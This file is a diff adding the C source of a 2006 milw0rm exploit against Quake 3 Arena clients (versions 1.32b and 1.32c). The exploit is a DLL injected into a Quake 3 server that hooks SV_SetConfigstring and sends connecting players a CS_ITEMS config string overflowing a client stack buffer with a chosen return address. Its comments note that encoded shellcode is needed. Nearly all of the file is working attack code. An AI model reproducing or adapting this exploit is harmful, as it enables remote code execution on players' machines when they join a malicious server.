@@ -1,0 +1,93 @@
+/*
+Quake 3 Engine Client CS_ITEMS Remote Stack Overflow Exploit (Win32)
+Written by RunningBon
+
+E-Mail: runningbon@gmail.com
+IRC: irc.rizon.net #kik
+
+This is a DLL, which gets injected into the server exe.
+
+You will need Microsoft Detours library to compile this exploit (http://research.microsoft.com/sn/detours/)
+I recommend you compile this with Microsoft Visual C++
+
+Use this responsibly. You are responsible for any damage you cause using this.
+
+Info:
+The engine strips bytes >127, '%', and '\0' before it overflows, so you will need encoded shellcode and an EIP which doesn't contain any of these characters.
+*/
+
+#include <stdio.h>
+#include <windows.h>
+#include <detours.h>
+
+struct VersionStruct {
+	char *pVersionString;
+	DWORD dwVersionStringAddr;
+	DWORD dwSetConfigstringAddr;
+	DWORD dwFillSize;
+	DWORD dwNewEIP;
+	int iCS_ITEM;
+};
+
+VersionStruct Versions[] = {
+	{ "Quake 3: Arena", 0x4C1B94, 0x431E70, 836, 0x13333337, 27 },	//Quake 3 Arena 1.32c
+	{ "Quake 3: Arena", 0x4D2184, 0x438610, 836, 0x13333337, 27 },	//Quake 3 Arena 1.32b
+};
+
+VersionStruct *pVersion = NULL;
+
+void (*orig_SV_SetConfigstring)(int iIndex, const char *pVal);
+void SV_SetConfigstring_Hook(int iIndex, const char *pVal)
+{
+	char szString[4096];
+	char *pPtr = NULL;
+
+	if(pVersion != NULL)
+	{
+		if(iIndex == pVersion->iCS_ITEM)
+		{
+			memset(szString, 0, sizeof(szString));
+			pPtr = &szString[0];
+
+			memset(pPtr, 'a', pVersion->dwFillSize);
+			pPtr += pVersion->dwFillSize;
+
+			memcpy(pPtr, (LPVOID)&pVersion->dwNewEIP, sizeof(DWORD));
+			pPtr += sizeof(DWORD);
+
+			orig_SV_SetConfigstring(iIndex, szString);
+
+			return;
+		}
+	}
+
+	orig_SV_SetConfigstring(iIndex, pVal);
+}
+
+bool WINAPI DllMain(HINSTANCE hInst, DWORD dwReason, LPVOID lpReserved)
+{
+	if(dwReason == DLL_PROCESS_ATTACH)
+	{
+		for(int i = 0; i < sizeof(Versions) / sizeof(Versions[0]); i++)
+		{
+			if(!stricmp((char*)Versions[i].dwVersionStringAddr, Versions[i].pVersionString))
+			{
+				pVersion = &Versions[i];
+				break;
+			}
+		}
+
+		if(pVersion == NULL)
+		{
+			//Could not find correct version
+			return 1;
+		}
+
+		DetourFunction((BYTE*)pVersion->dwSetConfigstringAddr, (BYTE*)SV_SetConfigstring_Hook);
+		_asm mov [orig_SV_SetConfigstring], eax
+	}
+
+	return 1;
+}
+
+// milw0rm.com [2006-07-02]
